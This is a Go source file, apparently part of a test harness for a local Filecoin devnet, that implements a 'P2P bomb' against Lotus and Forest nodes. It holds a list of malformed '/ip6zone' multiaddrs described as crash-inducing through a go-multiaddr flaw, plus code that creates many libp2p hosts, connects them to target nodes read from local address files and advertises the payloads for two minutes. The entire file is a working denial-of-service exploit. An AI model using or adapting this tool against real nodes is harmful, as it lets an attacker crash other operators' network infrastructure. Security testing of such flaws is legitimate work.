package resources

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"strings"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multiaddr"
)

// Malicious multiaddrs that can crash Lotus nodes via go-multiaddr vulnerability
var maliciousMultiaddrs = []string{
	// Original crash-inducing multiaddrs
	"/ip6zone/0",
	"/ip6zone/1",
	"/ip6zone/255",
	"/ip6zone/0xffff",
	"/ip6zone/abc123",
	"/ip6zone/0/tcp/1234",               // Zone with protocol (should also crash)
	"/ip6zone/0/udp/5678/quic",          // Zone with multiple protocols
	"/ip6zone/0/ip4/127.0.0.1/tcp/1234", // Zone followed by valid IP (edge case)

	// Incomplete/malformed multiaddrs
	"/ip6zone/",                 // Incomplete - missing value
	"/ip6zone",                  // Incomplete - missing slash
	"/ip6zone/0/",               // Incomplete - trailing slash
	"/ip6zone/0/tcp/",           // Incomplete - missing port
	"/ip6zone/0/tcp",            // Incomplete - missing slash and port
	"/ip6zone/0/udp/",           // Incomplete - missing port
	"/ip6zone/0/ip4/",           // Incomplete - missing IP
	"/ip6zone/0/ip4/127.0.0.1/", // Incomplete - missing protocol
	"/ip6zone/0/ip4/127.0.0.1",  // Incomplete - missing protocol and port

	// Random characters and edge cases
	"/ip6zone/0x",                 // Incomplete hex
	"/ip6zone/0x1",                // Short hex
	"/ip6zone/0x1234567890abcdef", // Long hex
	"/ip6zone/0xffffffffffffffff", // Max hex
	"/ip6zone/0x0000000000000000", // Zero hex
	"/ip6zone/0xdeadbeef",         // Common hex pattern
	"/ip6zone/0xbadcafe",          // Another hex pattern

	// Special characters and encoding issues
	"/ip6zone/0%20", // URL encoded space
	"/ip6zone/0%2f", // URL encoded slash
	"/ip6zone/0%3a", // URL encoded colon
	"/ip6zone/0%00", // URL encoded null byte
	"/ip6zone/0%ff", // URL encoded 0xFF
	"/ip6zone/0%0a", // URL encoded newline
	"/ip6zone/0%0d", // URL encoded carriage return
	"/ip6zone/0%09", // URL encoded tab

	// Unicode and special characters
	"/ip6zone/0\u0000", // Null byte
	"/ip6zone/0\u0001", // Start of heading
	"/ip6zone/0\u007f", // Delete character
	"/ip6zone/0\u0080", // Control character
	"/ip6zone/0\u00ff", // Extended ASCII
	"/ip6zone/0\u0100", // Unicode character
	"/ip6zone/0\u2000", // Unicode space
	"/ip6zone/0\u2028", // Line separator
	"/ip6zone/0\u2029", // Paragraph separator

	// Extremely long values
	"/ip6zone/" + strings.Repeat("0", 1000),       // 1000 zeros
	"/ip6zone/" + strings.Repeat("a", 1000),       // 1000 'a's
	"/ip6zone/" + strings.Repeat("0x", 500),       // 500 '0x's
	"/ip6zone/" + strings.Repeat("deadbeef", 100), // 100 'deadbeef's

	// Mixed case and formatting
	"/ip6zone/0XFFFF", // Uppercase hex
	"/ip6zone/0xffff", // Lowercase hex
	"/ip6zone/0Xffff", // Mixed case hex
	"/ip6zone/0xFFFF", // Mixed case hex
	"/ip6zone/0XfFfF", // Alternating case
	"/ip6zone/0x0",    // Single hex digit
	"/ip6zone/0x00",   // Two hex digits
	"/ip6zone/0x000",  // Three hex digits

	// Boundary conditions
	"/ip6zone/0x7fffffff",         // Max positive int32
	"/ip6zone/0x80000000",         // Min negative int32
	"/ip6zone/0xffffffff",         // Max uint32
	"/ip6zone/0x100000000",        // Beyond uint32
	"/ip6zone/0x7fffffffffffffff", // Max positive int64
	"/ip6zone/0x8000000000000000", // Min negative int64
	"/ip6zone/0xffffffffffffffff", // Max uint64

	// Malformed with extra components
	"/ip6zone/0//",      // Double slash
	"/ip6zone/0///",     // Triple slash
	"/ip6zone/0////",    // Quadruple slash
	"/ip6zone/0/tcp//",  // Missing port with double slash
	"/ip6zone/0/tcp///", // Missing port with triple slash
	"/ip6zone/0/ip4//",  // Missing IP with double slash
	"/ip6zone/0/ip4///", // Missing IP with triple slash

	// Protocol injection attempts
	"/ip6zone/0/tcp/1234/",       // Trailing slash after port
	"/ip6zone/0/tcp/1234//",      // Double trailing slash
	"/ip6zone/0/tcp/1234///",     // Triple trailing slash
	"/ip6zone/0/udp/5678/quic/",  // Trailing slash after quic
	"/ip6zone/0/udp/5678/quic//", // Double trailing slash after quic
}

// CreateP2PNodes creates n number of libp2p nodes with malicious multiaddrs
func CreateP2PNodes(ctx context.Context, n int) ([]host.Host, error) {
	log.Printf("[INFO] Creating %d malicious P2P nodes...", n)

	var hosts []host.Host

	for i := 0; i < n; i++ {
		// Create a new libp2p host with malicious multiaddr
		h, err := libp2p.New()
		if err != nil {
			log.Printf("[ERROR] Failed to create node %d: %v", i, err)
			continue
		}

		// Add malicious multiaddr to the host
		maliciousAddr := maliciousMultiaddrs[i%len(maliciousMultiaddrs)]
		addr, err := multiaddr.NewMultiaddr(maliciousAddr)
		if err != nil {
			log.Printf("[WARN] Failed to parse malicious multiaddr %s: %v", maliciousAddr, err)
			continue
		}

		// Add the malicious multiaddr to the host's address list
		h.Network().Listen(addr)

		hosts = append(hosts, h)
		log.Printf("[INFO] Created malicious P2P node %d with ID: %s, malicious addr: %s",
			i, h.ID().String(), maliciousAddr)
	}

	log.Printf("[INFO] Successfully created %d malicious P2P nodes", len(hosts))
	return hosts, nil
}

// ConnectToNodesFromPaths connects to nodes using multiaddrs from disk paths
func ConnectToNodesFromPaths(ctx context.Context, sourceHost host.Host, multiaddrPaths []string) error {
	log.Printf("[INFO] Connecting to %d nodes from disk paths...", len(multiaddrPaths))

	for _, path := range multiaddrPaths {
		// Read multiaddrs from file (multiple addresses per file)
		multiaddrs, err := readMultiaddrsFromFile(path)
		if err != nil {
			log.Printf("[WARN] Failed to read multiaddrs from %s: %v", path, err)
			continue
		}

		log.Printf("[INFO] Found %d multiaddrs in %s", len(multiaddrs), path)

		// Try to connect to each multiaddr from this file
		for j, multiaddrStr := range multiaddrs {
			// Parse multiaddr
			addr, err := multiaddr.NewMultiaddr(multiaddrStr)
			if err != nil {
				log.Printf("[WARN] Failed to parse multiaddr %s: %v", multiaddrStr, err)
				continue
			}

			// Extract peer ID from multiaddr
			peerInfo, err := peer.AddrInfoFromP2pAddr(addr)
			if err != nil {
				log.Printf("[WARN] Failed to extract peer info from %s: %v", multiaddrStr, err)
				continue
			}

			// Connect to the peer
			if err := sourceHost.Connect(ctx, *peerInfo); err != nil {
				log.Printf("[WARN] Failed to connect to peer %s: %v", peerInfo.ID, err)
				continue
			}

			log.Printf("[INFO] Successfully connected to peer from %s[%d]: %s", path, j, peerInfo.ID)
		}
	}

	return nil
}

// RunP2PBomb creates malicious nodes and connects them to exhaust resources and potentially crash nodes
func RunP2PBomb(ctx context.Context, nodeCount int) error {
	log.Printf("[INFO] Starting malicious P2P bomb with %d nodes for 2 minutes", nodeCount)

	// Define multiaddr paths using environment variables
	multiaddrPaths := []string{
		"/root/devgen/lotus-1/ipv4addr",
		"/root/devgen/lotus-2/ipv4addr",
		"/root/devgen/forest/forest-listen-addr",
	}

	log.Printf("[INFO] Using multiaddr paths: %v", multiaddrPaths)
	log.Printf("[INFO] Malicious multiaddrs that will be advertised:")
	for i, addr := range maliciousMultiaddrs {
		log.Printf("[INFO]   %d. %s", i+1, addr)
	}

	// Create malicious P2P nodes
	hosts, err := CreateP2PNodes(ctx, nodeCount)
	if err != nil {
		return fmt.Errorf("failed to create malicious P2P nodes: %w", err)
	}

	// Connect each malicious node to the target nodes from disk paths
	for i, host := range hosts {
		log.Printf("[INFO] Connecting malicious node %d to target nodes...", i)
		if err := ConnectToNodesFromPaths(ctx, host, multiaddrPaths); err != nil {
			log.Printf("[WARN] Failed to connect malicious node %d: %v", i, err)
		}

		// Trigger Identify protocol exchange to send malicious multiaddrs
		go triggerIdentifyExchange(ctx, host, i)
	}

	// Run the attack for 2 minutes
	log.Printf("[INFO] P2P bomb attack running for 2 minutes...")
	select {
	case <-time.After(2 * time.Minute):
		log.Printf("[INFO] P2P bomb attack completed after 2 minutes")
	case <-ctx.Done():
		log.Printf("[INFO] P2P bomb attack cancelled: %v", ctx.Err())
	}

	// Clean up connections
	log.Printf("[INFO] Cleaning up malicious P2P connections...")
	for i, host := range hosts {
		log.Printf("[INFO] Closing malicious node %d connections", i)
		host.Close()
	}

	log.Printf("[INFO] Malicious P2P bomb completed - created %d nodes with crash-inducing multiaddrs", len(hosts))
	return nil
}

// triggerIdentifyExchange triggers the Identify protocol to send malicious multiaddrs
func triggerIdentifyExchange(ctx context.Context, h host.Host, nodeIndex int) {
	time.Sleep(2 * time.Second)

	// Get all connected peers
	peers := h.Network().Peers()
	log.Printf("[INFO] Malicious node %d has %d connected peers", nodeIndex, len(peers))

	// For each peer, trigger Identify protocol exchange
	for _, peerID := range peers {
		log.Printf("[INFO] Malicious node %d triggering Identify exchange with peer %s", nodeIndex, peerID)

		// The Identify protocol will automatically send our malicious multiaddrs
		// when the peer requests our address list
		conns := h.Network().ConnsToPeer(peerID)
		if len(conns) > 0 {
			log.Printf("[INFO] Malicious node %d has %d connections to peer %s", nodeIndex, len(conns), peerID)
		}
	}
}

// Helper function to read multiple multiaddrs from file
func readMultiaddrsFromFile(filePath string) ([]string, error) {
	content, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read multiaddrs from %s: %w", filePath, err)
	}

	// Split by lines and filter out empty lines
	lines := strings.Split(string(content), "\n")
	var multiaddrs []string

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			multiaddrs = append(multiaddrs, line)
		}
	}

	return multiaddrs, nil
}
